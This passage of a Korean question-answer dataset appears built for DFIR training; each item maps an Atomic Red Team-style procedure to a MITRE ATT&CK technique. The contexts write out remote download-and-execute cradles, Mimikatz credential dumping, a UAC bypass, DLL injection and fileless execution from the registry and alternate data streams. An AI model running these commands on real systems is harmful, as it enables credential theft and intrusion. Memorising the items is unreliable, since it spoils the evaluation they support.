Atomic 정의 상에서는 출력 위치가 명시되어 있지 않으나, 실제 공격자는 이 데이터를 외부 C2로 전송하거나, 디스크에 저장하여 후속 수집에 사용한다.  6) 종료 및 정리:    - 테스트 종료 후에는 PowerShell 세션을 종료하거나, 인젝션된 DLL을 언로드(프로세스 종료 포함)하여 후킹을 제거한다.    - 포렌식 관점에서는:      · 프로세스 트리 내 mavinject.exe → powershell.exe 관계      · powershell.exe의 네트워크 연결(예: dst=www.example.com:443)      · Sysmon/ETW 기반 모듈 로드 이벤트(인젝션된 DLL 경로)      등을 단서로 탐지·분석이 가능하다.\n[대표 명령 예시]\nmavinject $pid /INJECTRUNNING \"#{file_name}\"\nInvoke-WebRequest #{server_name} -UseBasicParsing", "answer": "이 행위는 MITRE ATT&CK의 T1056.004 \"Input Capture: Credential API Hooking\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Collection / Credential Access이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1057_c5806a4f-62b8-4900-980b-c7ec004e9908_Q1", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1057 Process Discovery (Tactic: Discovery)\n[요약] cmd.exe에서 tasklist를 실행해 현재 시스템의 프로세스 목록을 확인한다.\n[절차] 1) 명령 프롬프트(cmd.exe)를 연다. 2) 아래 명령을 실행하여 전체 프로세스 목록을 확인한다.    · tasklist 3) 결과로 각 프로세스 이름, PID, 메모리 사용량 등이 표 형식으로 출력된다.\n[대표 명령 예시]\ntasklist", "answer": "이 행위는 MITRE ATT&CK의 T1057 \"Process Discovery\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Discovery이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1057_3b3809b6-a54b-4f5b-8aff-cb51f2e97b34_Q2", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1057 Process Discovery (Tactic: Discovery)\n[요약] PowerShell의 Get-Process cmdlet을 사용해 현재 실행 중인 프로세스를 열람한다.\n[절차] 1) PowerShell을 실행한다. 2) 아래 명령을 실행해 프로세스 목록을 가져온다.    · Get-Process 3) 프로세스 이름, PID, CPU 시간 등 다양한 정보가 표 형식으로 출력된다.\n[대표 명령 예시]\nGet-Process", "answer": "이 행위는 MITRE ATT&CK의 T1057 \"Process Discovery\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Discovery이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1057_b51239b4-0129-474f-a2b4-70f855b9f2c2_Q3", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1057 Process Discovery (Tactic: Discovery)\n[요약] PowerShell의 Get-WmiObject를 통해 WMI 클래스 Win32_Process를 조회하여 프로세스를 열람한다.\n[절차] 1) PowerShell을 실행한다. 2) 아래 명령을 실행한다.    · get-wmiObject -class Win32_Process 3) 각 프로세스에 대한 상세 정보(CommandLine, ExecutablePath 등)를 WMI를 통해 조회한다.\n[대표 명령 예시]\nget-wmiObject -class Win32_Process", "answer": "이 행위는 MITRE ATT&CK의 T1057 \"Process Discovery\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Discovery이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1057_640cbf6d-659b-498b-ba53-f6dd1a1cc02c_Q4", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1057 Process Discovery (Tactic: Discovery)\n[요약] wmic process get /format:list 명령을 통해 WMI 기반으로 전체 프로세스 목록과 속성을 조회한다.\n[절차] 1) 명령 프롬프트(cmd.exe)를 연다. 2) 다음 명령을 실행한다.    · wmic process get /format:list 3) 각 프로세스에 대한 다양한 속성이 key=value 형식으로 리스트 출력된다.\n[대표 명령 예시]\nwmic process get /format:list", "answer": "이 행위는 MITRE ATT&CK의 T1057 \"Process Discovery\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Discovery이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1057_11ba69ee-902e-4a0f-b3b6-418aed7d7ddb_Q5", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1057 Process Discovery (Tactic: Discovery)\n[요약] tasklist 출력에 findstr를 결합해 특정 프로세스 이름(기본: lsass)을 검색한다.\n[절차] 1) 명령 프롬프트(cmd.exe)를 연다. 2) 특정 프로세스를 찾기 위해 다음 명령을 실행한다.    · tasklist | findstr #{process_to_enumerate}    (기본값: process_to_enumerate = 'lsass') 3) 해당 문자열이 포함된 프로세스 행만 필터링되어 표시된다.    · 예: lsass.exe의 PID를 확인해 후속 메모리 덤프 공격 등으로 이어질 수 있음.\n[대표 명령 예시]\ntasklist | findstr #{process_to_enumerate}", "answer": "이 행위는 MITRE ATT&CK의 T1057 \"Process Discovery\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Discovery이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1057_966f4c16-1925-4d9b-8ce0-01334ee0867d_Q6", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1057 Process Discovery (Tactic: Discovery)\n[요약] 서드파티 도구 Process Hacker를 실행해 GUI로 프로세스/서비스 등 시스템 정보를 열람한다.\n[절차] 1) 사전 준비 단계에서 Process Hacker가 다음 경로에 설치되어 있어야 한다.    · C:\\Program Files\\Process Hacker 2\\ProcessHacker.exe    (없다면 get_prereq_command에 따라 설치용 exe를 다운로드 후 /s 옵션으로 무인 설치)  2) PowerShell을 관리자 권한으로 실행한다. 3) 다음 명령으로 Process Hacker를 실행한다.    · Start-Process -FilePath \"$Env:ProgramFiles\\Process Hacker 2\\#{processhacker_exe}\" 4) GUI 상에서 프로세스 트리, 핸들, 스레드, 모듈, 서비스, 네트워크 연결 등을 상세히 확인할 수 있다. 5) 공격자는 이를 활용해 보안 프로세스 종료, 인젝션 대상 탐색 등 후속 공격에 활용할 수 있다.\n[대표 명령 예시]\nStart-Process -FilePath \"$Env:ProgramFiles\\Process Hacker 2\\#{processhacker_exe}\"", "answer": "이 행위는 MITRE ATT&CK의 T1057 \"Process Discovery\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Discovery이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1057_b4ca838d-d013-4461-bf2c-f7132617b409_Q7", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1057 Process Discovery (Tactic: Discovery)\n[요약] PC Hunter 툴을 사용해 커널/프로세스/네트워크/시작 프로그램 등을 확인하고, 이를 통해 보안 우회 및 민감 정보 수집을 수행할 수 있다.\n[절차] 1) 사전 준비:    · get_prereq_command에 따라 C:\\Temp\\ExternalPayloads\\PCHunter_free.zip 을 다운로드하고,      해당 zip을 C:\\Temp\\ExternalPayloads 아래로 압축 해제한다.  2) PowerShell을 관리자 권한으로 실행한다. 3) 다음 명령을 실행해 PC Hunter를 실행한다.    · Start-Process -FilePath \"C:\\Temp\\ExternalPayloads\\PCHunter_free\\#{pchunter64_exe}\" 4) GUI에서 커널 모듈, 드라이버, 프로세스, 핸들, 서비스, 레지스트리, 네트워크 등의 상세 정보를 확인할 수 있다. 5) 공격자는 이를 활용해 보안 제품 비활성화, 루트킷 탐지 회피, 추가 공격 벡터 발굴 등을 수행할 수 있다.\n[대표 명령 예시]\nStart-Process -FilePath \"C:\\Temp\\ExternalPayloads\\PCHunter_free\\#{pchunter64_exe}\"", "answer": "이 행위는 MITRE ATT&CK의 T1057 \"Process Discovery\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Discovery이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1057_4fd35378-39aa-481e-b7c4-e3bf49375c67_Q8", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1057 Process Discovery (Tactic: Discovery)\n[요약] cmd에서 taskmgr.exe /7 스위치를 사용해 작업 관리자(Task Manager)를 실행하여 프로세스 목록을 GUI로 확인한다.\n[절차] 1) 명령 프롬프트(cmd.exe)를 연다. 2) 다음 명령을 실행한다.    · taskmgr.exe /7 3) 작업 관리자(Task Manager)가 열리며, 현재 실행 중인 프로세스, CPU/메모리 사용량 등을 확인할 수 있다. 4) 공격자는 이를 이용해 감지 우회 대상, 종료할 보안 프로세스 등을 식별할 수 있다.\n[대표 명령 예시]\ntaskmgr.exe /7", "answer": "이 행위는 MITRE ATT&CK의 T1057 \"Process Discovery\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Discovery이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1059_a9b93f17-31cb-435d-a462-5e838a2a6026_Q1", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1059 Command and Scripting Interpreter (Tactic: Execution)\n[요약] AutoIt 인터프리터를 사용해 calc.au3 스크립트를 실행하고, 성공 시 계산기(calc.exe)가 실행되는지 확인한다.\n[절차] 1) 사전 조건으로 AutoIt 실행 파일이 시스템에 설치되어 있어야 한다.    · 기본 경로: C:\\Program Files (x86)\\AutoIt3\\AutoIt3.exe    · 없을 경우, Atomic 정의의 get_prereq 단계에서 설치 파일을 다운로드 및 /S 옵션으로 무인 설치한다.  2) PowerShell을 실행한 뒤, 다음과 같이 AutoIt 인터프리터로 스크립트를 실행한다.    · Start-Process -FilePath \"#{autoit_path}\" -ArgumentList \"#{script_path}\"    (기본 script_path: PathToAtomicsFolder\\T1059\\src\\calc.au3)  3) 스크립트 실행에 성공하면 calc.exe(계산기)가 팝업된다. 4) 테스트 종료 후에는 계산기 프로세스를 수동으로 종료한다.\n[대표 명령 예시]\nStart-Process -FilePath \"#{autoit_path}\" -ArgumentList \"#{script_path}\"", "answer": "이 행위는 MITRE ATT&CK의 T1059 \"Command and Scripting Interpreter\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Execution이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1059.001_f3132740-55bc-48c4-bcc0-758a459cd027_Q1", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1059.001 Command and Scripting Interpreter: PowerShell (Tactic: Execution)\n[요약] GitHub에서 Invoke-Mimikatz 스크립트를 다운로드해 메모리 상에서 로드한 후, Invoke-Mimikatz -DumpCreds 로 자격 증명을 덤프한다.\n[절차] 1) PowerShellMafia의 Invoke-Mimikatz.ps1을 지정된 URL에서 다운로드한다. 2) IEX (DownloadString(...)) 방식으로 스크립트를 메모리에 로드한다. 3) Invoke-Mimikatz -DumpCreds 를 호출하여 자격 증명 및 해시를 덤프한다.\n[대표 명령 예시]\npowershell.exe \"IEX (New-Object Net.WebClient).DownloadString('#{mimurl}'); Invoke-Mimikatz -DumpCreds\"", "answer": "이 행위는 MITRE ATT&CK의 T1059.001 \"Command and Scripting Interpreter: PowerShell\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Execution이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1059.001_a21bb23e-e677-4ee7-af90-6931b57b6350_Q2", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1059.001 Command and Scripting Interpreter: PowerShell (Tactic: Execution)\n[요약] 로컬 디스크의 SharpHound.ps1 모듈을 Import 후 Invoke-BloodHound를 실행하여 AD 정찰 데이터를 수집·압축한다.\n[절차] 1) PathToAtomicsFolder\\..\\ExternalPayloads\\SharpHound.ps1 존재 여부를 확인한다. 2) 없으면 GitHub에서 SharpHound.ps1을 다운로드해 해당 경로에 저장한다. 3) PowerShell에서 Import-Module 로 SharpHound.ps1을 로드한다. 4) Invoke-BloodHound -OutputDirectory $env:Temp 를 실행하여 도메인 정보를 수집하고 ZIP 파일(*BloodHound.zip)을 생성한다.\n[대표 명령 예시]\nimport-module \"PathToAtomicsFolder\\..\\ExternalPayloads\\SharpHound.ps1\"\ntry { Invoke-BloodHound -OutputDirectory $env:Temp }\ncatch { $_; exit $_.Exception.HResult}\nStart-Sleep 5", "answer": "이 행위는 MITRE ATT&CK의 T1059.001 \"Command and Scripting Interpreter: PowerShell\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Execution이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1059.001_bf8c1441-4674-4dab-8e4e-39d93d08f9b7_Q3", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1059.001 Command and Scripting Interpreter: PowerShell (Tactic: Execution)\n[요약] SharpHound.ps1을 원격에서 다운로드 후 메모리에서 바로 로드하여 Invoke-BloodHound를 실행하는 파일리스 실행 패턴.\n[절차] 1) IEX (DownloadString(...)) 방식으로 GitHub의 SharpHound.ps1을 메모리에 로드한다. 2) Invoke-BloodHound -OutputDirectory $env:Temp 를 실행한다. 3) 완료 후 Temp 디렉터리에 BloodHound ZIP 파일이 생성된다.\n[대표 명령 예시]\nwrite-host \"Remote download of SharpHound.ps1 into memory, followed by execution of the script\" -ForegroundColor Cyan\nIEX (New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/804503962b6dc554ad7d324cfa7f2b4a566a14e2/Ingestors/SharpHound.ps1');\nInvoke-BloodHound -OutputDirectory $env:Temp\nStart-Sleep 5", "answer": "이 행위는 MITRE ATT&CK의 T1059.001 \"Command and Scripting Interpreter: PowerShell\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Execution이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1059.001_af1800cf-9f9d-4fd1-a709-14b1e6de020d_Q4", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1059.001 Command and Scripting Interpreter: PowerShell (Tactic: Execution)\n[요약] WScript.Shell과 SendKeys를 활용하여 Notepad를 제어하고, 메모리에 로드한 Invoke-Mimikatz를 실행해 자격 증명을 덤프하는 고난도 PowerShell 키보드 자동화 기법.\n[절차] 1) COM 객체 WScript.Shell 및 Windows.Forms.Clipboard를 사용해 Notepad 실행 및 포커스 획득. 2) SendKeys로 URL을 입력해 Invoke-Mimikatz.ps1 내용을 로드 후 클립보드로 가져온다. 3) IEX($res)로 로드된 스크립트를 실행하고 invoke-mimikatz -dumpcr 를 수행한다.\n[대표 명령 예시]\n$url='https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1';$wshell=New-Object -ComObject WScript.Shell; ... ;IEX($res);invoke-mimikatz -dumpcr", "answer": "이 행위는 MITRE ATT&CK의 T1059.001 \"Command and Scripting Interpreter: PowerShell\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Execution이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1059.001_06a220b6-7e29-4bd8-9d07-5b4d86742372_Q5", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1059.001 Command and Scripting Interpreter: PowerShell (Tactic: Execution)\n[요약] Invoke-AppPathBypass를 이용해 App Paths 취약점을 악용, UAC를 우회하여 cmd.exe를 고권한으로 실행하는 Windows 10 대상 시나리오.\n[절차] 1) enigma0x3의 Invoke-AppPathBypass.ps1 스크립트를 원격에서 다운로드하여 IEX로 로드한다. 2) Invoke-AppPathBypass -Payload 'C:\\Windows\\System32\\cmd.exe' 를 호출해 App Paths를 통한 UAC 우회 공격을 수행한다. 3) 성공 시 Windows 백업 및 복원 창 또는 지정 페이로드가 상승된 권한으로 실행될 수 있다.\n[대표 명령 예시]\nPowershell.exe \"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/enigma0x3/Misc-PowerShell-Stuff/a0dfca7056ef20295b156b8207480dc2465f94c3/Invoke-AppPathBypass.ps1'); Invoke-AppPathBypass -Payload 'C:\\Windows\\System32\\cmd.exe'\"", "answer": "이 행위는 MITRE ATT&CK의 T1059.001 \"Command and Scripting Interpreter: PowerShell\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Execution이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1059.001_388a7340-dbc1-4c9d-8e59-b75ad8c6d5da_Q6", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1059.001 Command and Scripting Interpreter: PowerShell (Tactic: Execution)\n[요약] MsXml2.ServerXmlHttp COM 객체를 이용해 Proxy 비인식(Non proxy-aware) HTTP 요청으로 PowerShell 스크립트를 다운로드 및 실행하는 크래들.\n[절차] 1) New-Object -ComObject MsXml2.ServerXmlHttp 로 COM 객체를 생성한다. 2) Open/Send 로 지정된 URL에서 스크립트 텍스트를 가져온다. 3) IEX $comMsXml.ResponseText 로 응답 내용을 실행한다. 4) 정상 실행 시 \"Download Cradle test success!\" 메시지가 출력된다.\n[대표 명령 예시]\npowershell.exe -exec bypass -noprofile \"$comMsXml=New-Object -ComObject MsXml2.ServerXmlHttp;$comMsXml.Open('GET','#{url}',$False);$comMsXml.Send();IEX $comMsXml.ResponseText\"", "answer": "이 행위는 MITRE ATT&CK의 T1059.001 \"Command and Scripting Interpreter: PowerShell\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Execution이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1059.001_4396927f-e503-427b-b023-31049b9b09a6_Q7", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1059.001 Command and Scripting Interpreter: PowerShell (Tactic: Execution)\n[요약] System.Xml.XmlDocument 로 XML을 로드하고, XML 내 command 노드의 내용을 실행하는 다운로드 크래들.\n[절차] 1) New-Object System.Xml.XmlDocument 로 XML Document 객체를 생성한다. 2) 지정된 URL의 XML을 Load 한다. 3) $Xml.command.a.execute 값을 IEX로 실행한다. 4) 성공 시 \"Download Cradle test success!\" 출력.\n[대표 명령 예시]\n\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -exec bypass -noprofile \"$Xml = (New-Object System.Xml.XmlDocument);$Xml.Load('#{url}');$Xml.command.a.execute | IEX\"", "answer": "이 행위는 MITRE ATT&CK의 T1059.001 \"Command and Scripting Interpreter: PowerShell\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Execution이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1059.001_8a2ad40b-12c7-4b25-8521-2737b0a415af_Q8", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1059.001 Command and Scripting Interpreter: PowerShell (Tactic: Execution)\n[요약] mshta.exe와 scriptlet(SCT)을 이용해 PowerShell 페이로드를 우회적으로 실행하는 다운로드 크래들.\n[절차] 1) cmd.exe 를 통해 mshta.exe javascript: 스킴을 호출한다. 2) GetObject('script:URL').Exec() 를 통해 원격 SCT 스크립트를 실행한다. 3) SCT 안에서 추가 PowerShell 명령이 실행되며, 별도 PowerShell 창이 열려 성공 메시지를 출력한다.\n[대표 명령 예시]\nC:\\Windows\\system32\\cmd.exe /c \"mshta.exe javascript:a=GetObject('script:#{url}').Exec();close()\"", "answer": "이 행위는 MITRE ATT&CK의 T1059.001 \"Command and Scripting Interpreter: PowerShell\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Execution이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1059.001_cc50fa2a-a4be-42af-a88f-e347ba0bf4d7_Q9", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1059.001 Command and Scripting Interpreter: PowerShell (Tactic: Execution)\n[요약] Invoke-DownloadCradle.ps1 스크립트를 PowerShell ISE에서 수동으로 실행해 네트워크·엔드포인트 아티팩트 생성 패턴을 재현하는 매뉴얼 테스트.\n[절차] 1) 관리자 권한으로 PowerShell_ISE를 실행한다. 2) Invoke-DownloadCradle.ps1 를 불러와 스크립트를 실행한다. 3) 다운로드 및 실행 과정에서 생성되는 네트워크/로그 아티팩트를 관찰한다.\n[대표 명령 예시]\n1. Open Powershell_ise as a Privileged Account\n2. Invoke-DownloadCradle.ps1", "answer": "이 행위는 MITRE ATT&CK의 T1059.001 \"Command and Scripting Interpreter: PowerShell\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Execution이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1059.001_fa050f5e-bc75-4230-af73-b6fd7852cd73_Q10", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1059.001 Command and Scripting Interpreter: PowerShell (Tactic: Execution)\n[요약] Base64로 인코딩된 PowerShell 코드를 레지스트리에 저장한 후, 레지스트리에서 직접 읽어와 실행하는 파일리스 실행 패턴.\n[절차] 1) HKCU:\\Software\\Classes\\AtomicRedTeam 키에 ART 값(인코딩된 PowerShell 코드)을 등록한다. 2) [Convert]::FromBase64String 과 Text.Encoding::ASCII.GetString 으로 값을 디코딩한다. 3) IEX 로 디코딩된 스크립트를 실행한다. 4) 실행 후 C:\\Windows\\Temp\\art-marker.txt 파일이 생성되면 성공.\n[대표 명령 예시]\nreg.exe add \"HKEY_CURRENT_USER\\Software\\Classes\\AtomicRedTeam\" /v ART /t REG_SZ /d \"U2V0LUNvbnRlbnQgLXBhdGggIiRlbnY6U3lzdGVtUm9vdC9UZW1wL2FydC1tYXJrZXIudHh0IiAtdmFsdWUgIkhlbGxvIGZyb20gdGhlIEF0b21pYyBSZWQgVGVhbSI=\" /f\niex ([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String((gp 'HKCU:\\Software\\Classes\\AtomicRedTeam').ART)))", "answer": "이 행위는 MITRE ATT&CK의 T1059.001 \"Command and Scripting Interpreter: PowerShell\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Execution이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1059.001_8e5c5532-1181-4c1d-bb79-b3a9f5dbd680_Q11", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1059.001 Command and Scripting Interpreter: PowerShell (Tactic: Execution)\n[요약] NTFS Alternate Data Stream(ADS)에 PowerShell 코드를 숨기고, 해당 스트림 내용을 읽어 Invoke-Expression으로 실행하는 기법.\n[절차] 1) #{ads_file} 파일을 생성하고 'streamCommand' 스트림에 Write-Host 코드 문자열을 쓴다. 2) Get-Content -Stream 'streamCommand' 로 ADS 내용을 읽는다. 3) Invoke-Expression 으로 문자열을 실행하고, \"Stream Data Executed\" 가 출력되는지 확인한다.\n[대표 명령 예시]\nAdd-Content -Path #{ads_file} -Value 'Write-Host \"Stream Data Executed\"' -Stream 'streamCommand'\n$streamcommand = Get-Content -Path #{ads_file} -Stream 'streamcommand'\nInvoke-Expression $streamcommand", "answer": "이 행위는 MITRE ATT&CK의 T1059.001 \"Command and Scripting Interpreter: PowerShell\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Execution이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1059.001_7c1acec2-78fa-4305-a3e0-db2a54cddecd_Q12", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1059.001 Command and Scripting Interpreter: PowerShell (Tactic: Execution)\n[요약] New-PSSession을 이용해 원격 PowerShell 세션을 생성하고, 기본 네트워크 테스트 및 파일 생성/확인을 수행하는 PSRemoting 사용 패턴.\n[절차] 1) New-PSSession -ComputerName #{hostname_to_connect} 로 원격 세션을 생성한다(기본값: 로컬 호스트). 2) Test-Connection 으로 네트워크 연결을 확인한다. 3) TEMP 경로에 T1086_* 파일을 생성 후 내용을 기록하고, Get-Content로 확인한 뒤 삭제한다.\n[대표 명령 예시]\nNew-PSSession -ComputerName #{hostname_to_connect}\nTest-Connection $env:COMPUTERNAME\nSet-Content -Path $env:TEMP\\T1086_PowerShell_Session_Creation_and_Use -Value \"T1086 PowerShell Session Creation and Use\"\nGet-Content -Path $env:TEMP\\T1086_PowerShell_Session_Creation_and_Use\nRemove-Item -Force $env:TEMP\\T1086_PowerShell_Session_Creation_and_Use", "answer": "이 행위는 MITRE ATT&CK의 T1059.001 \"Command and Scripting Interpreter: PowerShell\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Execution이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1059.001_686a9785-f99b-41d4-90df-66ed515f81d7_Q13", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1059.001 Command and Scripting Interpreter: PowerShell (Tactic: Execution)\n[요약] AtomicTestHarnesses 모듈의 Out-ATHPowerShellCommandLineParameter를 사용해 -Command 파라미터의 다양한 표기(C, Command 등)를 테스트하며 PowerShell 실행 패턴을 생성.\n[절차] 1) AtomicTestHarnesses 모듈이 설치되어 있고 Out-ATHPowerShellCommandLineParameter가 Export되어 있는지 확인한다. 2) 필요한 경우 Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force 를 통해 설치한다. 3) Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType #{command_line_switch_type} -CommandParamVariation #{command_param_variation} -Execute 를 호출한다. 4) 다양한 -Command 형태로 실행되는 PowerShell 프로세스를 관찰한다.\n[대표 명령 예시]\nOut-ATHPowerShellCommandLineParameter -CommandLineSwitchType #{command_line_switch_type} -CommandParamVariation #{command_param_variation} -Execute -ErrorAction Stop", "answer": "이 행위는 MITRE ATT&CK의 T1059.001 \"Command and Scripting Interpreter: PowerShell\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Execution이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
